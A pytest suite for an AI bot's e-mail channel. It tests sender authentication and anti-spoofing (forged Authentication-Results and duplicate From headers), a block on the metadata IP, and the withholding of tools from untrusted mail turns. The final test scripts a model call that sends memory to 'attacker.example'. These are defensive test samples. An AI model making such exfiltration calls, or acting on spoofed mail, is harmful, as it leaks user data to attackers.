"""E-mail channel: parsing rules, spoof/auto-reply filtering, poller with a fake IMAP/SMTP, no confirmer."""

from __future__ import annotations

import asyncio
import json
import smtplib
import ssl
from email.message import EmailMessage

import pytest

from stack_kit import Stack
from ai_bot.channels import email_channel as E
from ai_bot.channels.base import ChannelError, chat_id_for
from tests.fakes import reply, tool_call
from tests.test_channels_env import ChEnv, EMAIL_PASSWORD, chenv  # noqa: F401

ME = "ali@example.com"
BOT = "bot@example.org"
AUTH_OK = "mx.example.org; dkim=pass header.d=example.com; spf=pass smtp.mailfrom=ali@example.com"


def mail(body="Yarın hava nasıl?", *, sender=ME, auth: str | None = AUTH_OK, subject="Soru", html=None, extra=None,
         message_id="<m1@example.com>") -> bytes:
    m = EmailMessage()
    m["From"] = f"Ali <{sender}>"
    m["To"] = BOT
    m["Subject"] = subject
    m["Message-ID"] = message_id
    if auth is not None:
        m["Authentication-Results"] = auth
    for k, v in (extra or {}).items():
        m[k] = v
    if html is not None:
        m.set_content("")
        m.add_alternative(html, subtype="html")
        if body:
            m.get_payload()[0].set_content(body)
    else:
        m.set_content(body)
    return m.as_bytes()


def check(raw, allowed=(ME,), require_auth=True, authserv=""):
    return E.evaluate(raw, allowed=set(allowed), require_auth=require_auth, own=BOT, authserv_id=authserv)


# ------------------------------------------------------------------ parsing


def test_plain_mail_is_accepted():
    verdict, parsed = check(mail())
    assert verdict == "ok" and parsed.sender == ME and parsed.text == "Yarın hava nasıl?"
    assert parsed.subject == "Soru" and parsed.message_id == "<m1@example.com>"


def test_sender_must_match_exactly_and_case_insensitively():
    assert check(mail(sender="ALI@Example.com"))[0] == "ok"
    assert check(mail(sender="ali@example.com.evil.io"))[0] == "not_allowed"
    assert check(mail(sender="x@example.com"))[0] == "not_allowed"
    assert check(mail(), allowed=())[0] == "not_allowed"  # empty list = nobody


def test_spoofed_sender_without_authentication_results_is_dropped():
    assert check(mail(auth=None))[0] == "spoofed"
    assert check(mail(auth="mx.example.org; dkim=fail header.d=example.com; spf=fail smtp.mailfrom=ali@example.com"))[0] == "spoofed"
    assert check(mail(auth="mx; dkim=pass header.d=attacker.net; spf=softfail smtp.mailfrom=x@attacker.net"))[0] == "spoofed"
    assert check(mail(auth="mx; dkim=pass header.d=example.com"))[0] == "ok"
    assert check(mail(auth="mx; spf=pass smtp.mailfrom=ali@example.com"))[0] == "ok"
    assert check(mail(auth=None), require_auth=False)[0] == "ok"  # operator switched the check off


def test_only_the_topmost_authentication_results_header_counts():
    forged_below = mail(auth="mx.example.org; dkim=fail header.d=example.com",
                        extra={"X-Other": "1"})
    msg = forged_below.replace(b"Authentication-Results:", b"Authentication-Results: mx; dkim=fail\nAuthentication-Results:", 1)
    # first header says fail, a second (older, attacker supplied) one says pass: the first wins
    msg = msg.replace(b"\n\n", b"\nAuthentication-Results: evil; dkim=pass header.d=example.com\n\n", 1)
    assert check(msg)[0] == "spoofed"


@pytest.mark.parametrize("extra", [{"Auto-Submitted": "auto-replied"}, {"Auto-Submitted": "auto-generated"},
                                   {"Precedence": "bulk"}, {"Precedence": "junk"}, {"Precedence": "list"},
                                   {"List-Id": "<news.example.com>"}, {"X-Autoreply": "yes"}])
def test_auto_replies_and_lists_are_skipped(extra):
    assert check(mail(extra=extra))[0] == "auto"


def test_auto_submitted_no_is_a_normal_mail_and_noreply_senders_are_skipped():
    assert check(mail(extra={"Auto-Submitted": "no"}))[0] == "ok"
    for s in ("no-reply@example.com", "noreply@example.com", "mailer-daemon@example.com", "do-not-reply@example.com"):
        assert check(mail(sender=s, auth=None), allowed=(s,), require_auth=False)[0] == "auto", s


def test_own_address_is_never_processed():
    assert check(mail(sender=BOT, auth=None), allowed=(BOT,), require_auth=False)[0] == "self"


def test_quoted_text_is_removed():
    body = ("Teşekkürler, şunu da ekle: süt almayı unutma.\n\n"
            "On Mon, 2 Jan 2026 at 10:00, Bot <bot@example.org> wrote:\n> Yarın yağmur var.\n> Şemsiye al.\n")
    assert check(mail(body))[1].text == "Teşekkürler, şunu da ekle: süt almayı unutma."
    body2 = "Tamam\n> eski satır\nson satır\n\n-----Original Message-----\nFrom: x\nSent: y\n"
    assert check(mail(body2))[1].text == "Tamam\nson satır"
    body3 = "Merhaba\n\nOn Mon, 2 Jan 2026 at 10:00 Bot <bot@example.org>\nwrote:\n> eski"
    assert check(mail(body3))[1].text == "Merhaba"
    body4 = "Evet\n\n2 Oca 2026 Pzt 10:00 tarihinde Bot <bot@example.org> yazdı:\n> eski"
    assert check(mail(body4))[1].text == "Evet"
    assert check(mail("> eski\n> eski 2"))[0] == "empty"


def test_html_only_mail_falls_back_to_text():
    raw = mail("", html="<html><body><p>Merhaba <b>dünya</b></p><script>alert(1)</script><p>İkinci satır</p></body></html>")
    verdict, parsed = check(raw)
    assert verdict == "ok" and "Merhaba dünya" in parsed.text and "İkinci satır" in parsed.text and "alert" not in parsed.text


def test_text_part_wins_over_html_and_attachments_are_ignored():
    m = EmailMessage()
    m["From"], m["To"], m["Subject"], m["Authentication-Results"] = ME, BOT, "x", AUTH_OK
    m.set_content("düz metin")
    m.add_alternative("<p>html metin</p>", subtype="html")
    m.add_attachment(b"SECRET-ATTACHMENT", maintype="application", subtype="octet-stream", filename="a.bin")
    verdict, parsed = check(m.as_bytes())
    assert verdict == "ok" and parsed.text == "düz metin" and "SECRET" not in parsed.text


def test_body_is_cut_at_4000_chars():
    assert len(check(mail("a" * 9000))[1].text) == 4000


def test_reply_subject():
    assert E.reply_subject("Soru") == "Re: Soru" and E.reply_subject("RE: Soru") == "RE: Soru" and E.reply_subject("") == "Re: ai-bot"


# ------------------------------------------------------------------ poller + sender with fakes


class FakeImap:
    def __init__(self, messages: dict[int, bytes], validity: int = 7):
        self.messages = messages
        self.validity = validity
        self.header_fetches = 0
        self.seen: set[int] = set()
        self.fetched_full: list[int] = []
        self.logged_out = False

    def login(self, user, pw):
        return "OK", []

    def select(self, box, readonly=False):
        return "OK", [b"1"]

    def response(self, name):
        return name, [str(self.validity).encode()]

    def logout(self):
        self.logged_out = True

    def uid(self, cmd, *args):
        if cmd == "SEARCH":
            return "OK", [b" ".join(str(u).encode() for u in self.messages if u not in self.seen)]
        if cmd == "STORE":
            self.seen.add(int(args[0]))
            return "OK", []
        uid = int(args[0])
        raw = self.messages[uid]
        if "HEADER" in args[1]:
            self.header_fetches += 1
            head = raw.split(b"\r\n\r\n", 1)[0] + b"\r\n\r\n"
            return "OK", [(f"{uid} (UID {uid} RFC822.SIZE {len(raw)} BODY[HEADER] {{{len(head)}}}".encode(), head), b")"]
        self.fetched_full.append(uid)
        return "OK", [(f"{uid} (UID {uid} BODY[] {{{len(raw)}}}".encode(), raw), b")"]


class FakeSmtp:
    def __init__(self):
        self.sent: list[EmailMessage] = []

    def send_message(self, msg):
        self.sent.append(msg)

    def noop(self):
        return 250, b"ok"

    def quit(self):
        pass


def email_on(env: ChEnv, allowed=(ME,), **extra):
    env.set(EMAIL_ENABLED=True, EMAIL_IMAP_HOST="imap.example.org", EMAIL_IMAP_USER=BOT, EMAIL_SMTP_HOST="smtp.example.org",
            EMAIL_FROM=BOT, EMAIL_PASSWORD=EMAIL_PASSWORD, EMAIL_ALLOWED_SENDERS=", ".join(allowed), **extra)
    return env.mgr.channels["email"]


def test_poll_handles_only_trusted_mail_and_leaves_the_rest_untouched(chenv):
    ch = email_on(chenv)
    imap = FakeImap({
        1: mail("Birinci soru", message_id="<a@x>"),
        2: mail("Sahte", auth=None, message_id="<b@x>"),
        3: mail("Yabancı", sender="stranger@evil.example", message_id="<c@x>"),
        4: mail("Otomatik", extra={"Auto-Submitted": "auto-replied"}, message_id="<d@x>"),
        5: mail("İkinci soru", message_id="<e@x>"),
    })
    ch._open_imap = lambda: imap
    found = ch.poll_sync()
    assert [m.text for m in found] == ["Birinci soru", "İkinci soru"]
    assert imap.seen == {1, 4, 5}  # spoofed (2) and stranger (3) stay unseen: the mailbox is not touched
    # the sender/authentication checks run on the headers: neither the stranger's nor the spoofed body is downloaded
    assert 3 not in imap.fetched_full and 2 not in imap.fetched_full and 4 not in imap.fetched_full and imap.logged_out
    assert ch.poll_sync() == []  # nothing new; skipped uids are not fetched again
    assert imap.header_fetches == 5


def test_mail_end_to_end_reply_headers_and_tainted_no_confirm(tmp_path):
    stack = Stack("ai-bot", "test")
    executed: list = []

    @stack.tool("x.buy", "Buy", confirm=True, scope="trade")
    def buy(symbol: str) -> dict:
        executed.append(symbol)
        return {"ok": True}

    env = ChEnv(tmp_path, stack=stack, script=[reply(calls=[tool_call("x_buy", {"symbol": "XAU"})]),
                                               reply(calls=[tool_call("memory_remember", {"content": "Kullanıcı kedi sever"})]),
                                               reply("Cevap metni")])
    ch = email_on(env)
    smtp = FakeSmtp()
    ch._open_smtp = lambda: smtp
    parsed = E.evaluate(mail("altın al", subject="Alım"), allowed={ME}, require_auth=True, own=BOT)[1]
    asyncio.run(ch.handle_mail(parsed))
    assert executed == []  # no confirmer on e-mail: confirmation-required tools are refused, never run
    tool_msgs = [json.loads(m["content"]) for body in env.llm.requests for m in body["messages"] if m["role"] == "tool"]
    assert tool_msgs[0]["error"]["code"] == "confirmation_required"
    assert tool_msgs[1]["error"]["code"] == "confirmation_required"  # tainted turn: memory write needs a human too
    assert len(smtp.sent) == 1
    out = smtp.sent[0]
    assert out["To"] == ME and out["From"] == BOT and out["Subject"] == "Re: Alım"
    assert out["In-Reply-To"] == "<m1@example.com>" and "<m1@example.com>" in out["References"]
    assert out["Auto-Submitted"] == "auto-replied"
    assert out.get_content().strip() == "Cevap metni"
    assert ch.can_confirm is False and env.mgr.confirmer_for(chat_id_for("email", ME)) is None


def test_duplicate_message_id_and_rate_limit(tmp_path):
    env = ChEnv(tmp_path)
    ch = email_on(env)
    smtp = FakeSmtp()
    ch._open_smtp = lambda: smtp
    p = E.evaluate(mail(), allowed={ME}, require_auth=True, own=BOT)[1]
    asyncio.run(ch.handle_mail(p))
    asyncio.run(ch.handle_mail(p))
    assert len(smtp.sent) == 1


def test_check_host_blocks_metadata_and_link_local():
    for host in ("169.254.169.254", "169.254.10.10", "0.0.0.0"):
        with pytest.raises(ChannelError) as exc:
            E.check_host(host)
        assert exc.value.code == "email_blocked"
    E.check_host("127.0.0.1")  # a mail server on the LAN/loopback is a normal setup


def test_imap_uses_verified_tls(tmp_path, monkeypatch):
    env = ChEnv(tmp_path)
    ch = email_on(env)
    seen = {}

    class Imap:
        def __init__(self, host, port, ssl_context=None, timeout=None):
            seen.update(host=host, port=port, ctx=ssl_context)

        def login(self, u, p):
            seen["login"] = (u, p)

    monkeypatch.setattr(E, "check_host", lambda h: None)
    monkeypatch.setattr(E.imaplib, "IMAP4_SSL", Imap)
    ch._open_imap()
    ctx = seen["ctx"]
    assert seen["host"] == "imap.example.org" and seen["port"] == 993
    assert ctx.verify_mode == ssl.CERT_REQUIRED and ctx.check_hostname is True


def test_smtp_never_falls_back_to_plaintext(tmp_path, monkeypatch):
    env = ChEnv(tmp_path)
    ch = email_on(env)
    calls = []

    class NoTls:
        def __init__(self, host, port, timeout=None):
            pass

        def ehlo(self):
            calls.append("ehlo")

        def has_extn(self, name):
            return False

        def starttls(self, context=None):
            calls.append("starttls")

        def login(self, u, p):
            calls.append("login")

        def close(self):
            pass

    monkeypatch.setattr(E, "check_host", lambda h: None)
    monkeypatch.setattr(E.smtplib, "SMTP", NoTls)
    with pytest.raises(smtplib.SMTPNotSupportedError):
        ch._open_smtp()
    assert "login" not in calls  # the password is never sent without TLS
    assert E.map_error(smtplib.SMTPNotSupportedError("x")).code == "email_starttls"


def test_error_mapping_is_safe_and_specific():
    assert E.map_error(ssl.SSLCertVerificationError("secret-host-detail")).code == "email_tls"
    assert E.map_error(smtplib.SMTPAuthenticationError(535, b"bad creds")).code == "email_auth"
    assert E.map_error(OSError("boom")).code == "email_unreachable"
    assert E.map_error(TimeoutError()).code == "email_timeout"
    assert "secret-host-detail" not in E.map_error(ssl.SSLCertVerificationError("secret-host-detail")).message


def test_poller_task_starts_stops_and_is_idle_while_disabled(tmp_path):
    env = ChEnv(tmp_path)

    async def scenario():
        await env.mgr.start()
        ch = env.mgr.channels["email"]
        assert ch._task is not None and not ch._task.done()
        await asyncio.sleep(0.05)
        assert ch.last_poll is None  # disabled: nothing polled
        await env.ai.aclose()
        assert ch._task is None

    asyncio.run(scenario())


# ------------------------------------------------------------------ authentication bypasses (security review)


def auth(value, **kw):
    return check(mail(auth=value), **kw)[0]


def test_spf_pass_counts_only_with_an_aligned_smtp_mailfrom():
    assert auth("mx.example.org; spf=pass smtp.helo=example.com") == "spoofed"  # helo only
    assert auth("mx.example.org; spf=pass smtp.helo=example.com smtp.mailfrom=bounce@attacker.net") == "spoofed"
    assert auth("mx.example.org; spf=pass") == "spoofed"  # no identifier at all
    assert auth("mx.example.org; spf=pass smtp.mailfrom=attacker.net") == "spoofed"
    assert auth("mx.example.org; spf=pass smtp.mailfrom=ali@sub.example.com") == "spoofed"  # exact domain required
    assert auth("mx.example.org; spf=pass smtp.mailfrom=ali@example.com") == "ok"
    assert auth("mx.example.org; spf=pass smtp.mailfrom=example.com") == "ok"
    assert auth("mx.example.org; spf=softfail smtp.mailfrom=ali@example.com") == "spoofed"


def test_dkim_pass_needs_header_d_and_alignment():
    assert auth("mx.example.org; dkim=pass") == "spoofed"  # bare pass
    assert auth("mx.example.org; dkim=pass header.i=@example.com") == "spoofed"  # header.d is required
    assert auth("mx.example.org; dkim=pass header.d=com") == "spoofed"  # public suffix
    raw = mail(sender="a@shop.co.uk", auth="mx.example.org; dkim=pass header.d=co.uk")
    assert check(raw, allowed=("a@shop.co.uk",))[0] == "spoofed"  # co.uk is a public suffix
    raw = mail(sender="a@shop.co.uk", auth="mx.example.org; dkim=pass header.d=shop.co.uk")
    assert check(raw, allowed=("a@shop.co.uk",))[0] == "ok"
    assert auth("mx.example.org; dkim=pass header.d=attacker.net") == "spoofed"
    assert auth("mx.example.org; dkim=pass header.d=sub.example.com") == "spoofed"  # child of the From domain
    assert auth("mx.example.org; dkim=pass header.d=example.com") == "ok"
    assert auth("mx.example.org; dkim=fail header.d=example.com") == "spoofed"
    raw = mail(sender="ali@mail.example.com", auth="mx.example.org; dkim=pass header.d=example.com")
    assert check(raw, allowed=("ali@mail.example.com",))[0] == "ok"  # organisational parent of the From domain
    raw = mail(sender="ali@badexample.com", auth="mx.example.org; dkim=pass header.d=example.com")
    assert check(raw, allowed=("ali@badexample.com",))[0] == "spoofed"  # suffix match must be on a dot boundary


def test_dmarc_pass_with_aligned_header_from():
    assert auth("mx.example.org; dmarc=pass header.from=example.com") == "ok"
    assert auth("mx.example.org; dmarc=pass header.from=attacker.net") == "spoofed"
    assert auth("mx.example.org; dmarc=pass") == "spoofed"
    assert auth("mx.example.org; dmarc=fail header.from=example.com") == "spoofed"


def test_comments_and_noise_in_authentication_results_are_handled():
    assert auth("mx.example.org (Postfix); dkim=pass (2048-bit key; unprotected) header.d=example.com header.i=@example.com") == "ok"
    assert auth("mx.example.org 1; spf=pass (sender IP is 1.2.3.4) smtp.mailfrom=ali@example.com; dmarc=fail") == "ok"


def test_duplicate_from_headers_or_addresses_are_refused():
    raw = mail(auth=AUTH_OK).replace(b"\nTo:", b"\nFrom: Evil <evil@attacker.net>\nTo:", 1)
    assert raw.count(b"\nFrom:") == 1 and raw.startswith(b"From:")  # the second one sits below the first
    assert check(raw)[0] == "spoofed"
    assert check(raw, require_auth=False)[0] == "spoofed"  # refused even with the auth check off
    two = mail(auth=AUTH_OK).replace(b"From: Ali <ali@example.com>", b"From: Ali <ali@example.com>, Evil <evil@attacker.net>", 1)
    assert check(two)[0] == "spoofed"


def test_authserv_id_pins_which_header_counts():
    ours = "mx.example.org; spf=pass smtp.mailfrom=ali@example.com"
    forged = "evil.example.net; spf=pass smtp.mailfrom=ali@example.com"
    failing = "mx.example.org; spf=fail smtp.mailfrom=ali@example.com"

    def two_headers(first, second):
        raw = mail(auth=first)
        return raw.replace(b"\n\n", b"\nAuthentication-Results: " + second.encode() + b"\n\n", 1)

    # without a configured id the topmost header is trusted (documented risk)
    assert check(mail(auth=forged))[0] == "ok"
    # with the id: a header from another server never counts
    assert check(mail(auth=forged), authserv="mx.example.org")[0] == "spoofed"
    assert check(mail(auth=ours), authserv="mx.example.org")[0] == "ok"
    assert check(mail(auth=ours), authserv="MX.Example.org")[0] == "ok"
    # our header on top, an attacker's header (claiming a pass) below it
    assert check(two_headers(failing, "mx.example.org; spf=pass smtp.mailfrom=ali@example.com"), authserv="mx.example.org")[0] == "spoofed"
    # a second header claiming OUR id even though the top one is ours: forged position, refuse
    assert check(two_headers(ours, ours), authserv="mx.example.org")[0] == "spoofed"
    # an unrelated header on top and ours below is not a header we wrote
    assert check(two_headers(forged, ours), authserv="mx.example.org")[0] == "spoofed"
    # our header on top, a foreign one below: fine
    assert check(two_headers(ours, forged), authserv="mx.example.org")[0] == "ok"


def test_poll_uses_the_configured_authserv_id(chenv):
    ch = email_on(chenv, EMAIL_AUTHSERV_ID="mx.example.org")
    imap = FakeImap({1: mail("kabul", auth="mx.example.org; spf=pass smtp.mailfrom=ali@example.com", message_id="<a@x>"),
                     2: mail("sahte sunucu", auth="evil.net; spf=pass smtp.mailfrom=ali@example.com", message_id="<b@x>")})
    ch._open_imap = lambda: imap
    assert [m.text for m in ch.poll_sync()] == ["kabul"]
    assert 2 not in imap.fetched_full


# ------------------------------------------------------------------ fetch cost


def test_auto_replies_are_marked_seen_without_downloading_the_body(chenv):
    ch = email_on(chenv)
    imap = FakeImap({1: mail("otomatik", extra={"Auto-Submitted": "auto-replied"}, message_id="<a@x>")})
    ch._open_imap = lambda: imap
    assert ch.poll_sync() == []
    assert imap.seen == {1} and imap.fetched_full == []


def test_fetches_per_poll_are_capped(chenv):
    ch = email_on(chenv)
    msgs = {i: mail(f"soru {i}", message_id=f"<m{i}@x>") for i in range(1, 26)}
    imap = FakeImap(msgs)
    ch._open_imap = lambda: imap
    first = ch.poll_sync()
    assert len(first) == E.MAX_PER_POLL and len(imap.fetched_full) == E.MAX_PER_POLL
    second = ch.poll_sync()  # the rest waits for the next poll
    assert len(second) == E.MAX_PER_POLL
    assert len(ch.poll_sync()) == 5
    strangers = FakeImap({i: mail("x", sender=f"s{i}@evil.example", message_id=f"<s{i}@x>") for i in range(1, 100)})
    ch._open_imap = lambda: strangers
    ch.poll_sync()
    assert strangers.header_fetches == E.MAX_HEADERS_PER_POLL and strangers.fetched_full == []


def test_skip_memory_is_keyed_by_uidvalidity_and_uid(chenv):
    ch = email_on(chenv)
    spoof = {1: mail("sahte", auth=None, message_id="<a@x>")}
    imap = FakeImap(spoof, validity=7)
    ch._open_imap = lambda: imap
    ch.poll_sync()
    ch.poll_sync()
    assert imap.header_fetches == 1  # same (validity, uid): remembered
    imap2 = FakeImap({1: mail("meşru", message_id="<b@x>")}, validity=8)  # mailbox was rebuilt: uid 1 is another message
    ch._open_imap = lambda: imap2
    assert [m.text for m in ch.poll_sync()] == ["meşru"]
    assert (7, 1) in ch._skip and (8, 1) in ch._skip


def test_web_read_is_hidden_from_mail_turns_but_web_search_stays(tmp_path):
    env = ChEnv(tmp_path, script=[reply("cevap")])
    ch = email_on(env)
    ch._open_smtp = lambda: FakeSmtp()
    p = E.evaluate(mail(), allowed={ME}, require_auth=True, own=BOT)[1]
    asyncio.run(ch.handle_mail(p))
    names = {t["function"]["name"] for t in env.llm.requests[0]["tools"]}
    assert "web_read" not in names and "web_search" in names and "memory_recall" in names
    # a normal (WhatsApp) turn still sees web.read
    env.whatsapp(allowed=("905551112233",))
    asyncio.run(env.ai.run_ai(__import__("ai_bot.channels.base", fromlist=["x"]).chat_id_for("whatsapp", "905551112233"), "selam"))
    assert "web_read" in {t["function"]["name"] for t in env.llm.requests[-1]["tools"]}


def test_a_hidden_tool_cannot_be_called_even_if_the_model_asks(tmp_path):
    env = ChEnv(tmp_path, script=[reply(calls=[tool_call("web_read", {"url": "https://attacker.example/?q=memory"})]), reply("bitti")])
    ch = email_on(env)
    ch._open_smtp = lambda: FakeSmtp()
    p = E.evaluate(mail(), allowed={ME}, require_auth=True, own=BOT)[1]
    asyncio.run(ch.handle_mail(p))
    tool_msgs = [json.loads(m["content"]) for b in env.llm.requests for m in b["messages"] if m["role"] == "tool"]
    assert tool_msgs[0]["error"]["code"] == "not_found"
